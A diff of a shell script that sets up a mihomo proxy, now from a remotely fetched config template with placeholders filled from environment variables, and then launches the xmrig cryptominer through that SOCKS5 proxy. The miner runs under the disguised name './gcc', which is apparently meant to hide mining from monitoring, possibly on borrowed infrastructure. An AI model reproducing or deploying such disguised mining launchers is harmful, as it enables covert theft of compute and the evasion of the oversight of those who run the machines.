@@ -80,32 +80,19 @@ function cleanup_mihomo {
 }
 trap cleanup_mihomo EXIT INT TERM
 
-cp -- mihomo-cfg.yaml $MIHOMO_WD/raw.yaml
-sed -E '/^(mixed-port|port|socks-port|redir-port|tproxy-port|mode|external-controller|external-ui|allow-lan):/d' $MIHOMO_WD/raw.yaml > $MIHOMO_WD/stripped.yaml
-{
-    echo 'mixed-port: 7890'
-    echo 'mode: global'
-    echo 'allow-lan: false'
-    cat $MIHOMO_WD/stripped.yaml
-} > $MIHOMO_WD/config.yaml
 if [ $USE_MIHOMO ]; then
-    ./mihomo -d $MIHOMO_WD >$MIHOMO_WD/clash.log 2>&1 &
-fi
-MIHOMO_PID=$!
-
-echo '>> 等待代理就绪 ...'
-for i in {1..30}; do
-    if curl -fsS --max-time 3 -x socks5h://127.0.0.1:7890 http://www.gstatic.com/generate_204 -o /dev/null 2>/dev/null; then
-        echo '>> 代理就绪.'
-        break
-    fi
-    sleep 1
-    if [ $i = 30 ]; then
-        echo '代理启动超时.  日志如下:' >&2
-        cat $MIHOMO_WD/clash.log >&2
+    curl -fsSL -o $MIHOMO_WD/config.yaml \
+        https://raw.githubusercontent.com/shynur/HOME/refs/heads/trunk/.config/mihomo/template.yaml
+    for VAR in "${!MY_MIHOMO_CFG_@}"; do
+        sed -i "s|@${VAR#MY_MIHOMO_CFG_}@|${!VAR}|g" $MIHOMO_WD/config.yaml
+    done
+    if grep -oE '@[A-Z_]+@' $MIHOMO_WD/config.yaml; then
+        echo '上述占位符缺少对应的 MY_MIHOMO_CFG_* 环境变量' >&2
         exit 1
     fi
-done
+    ./mihomo -d $MIHOMO_WD >$MIHOMO_WD/clash.log 2>&1 &
+    MIHOMO_PID=$!
+fi
 
 echo '>> 启动 xmrig (stratum 经 SOCKS5) ...'
 ./gcc   -a $ALG   -o "$POOL"   -u $DEV   -p x    -x 127.0.0.1:7890
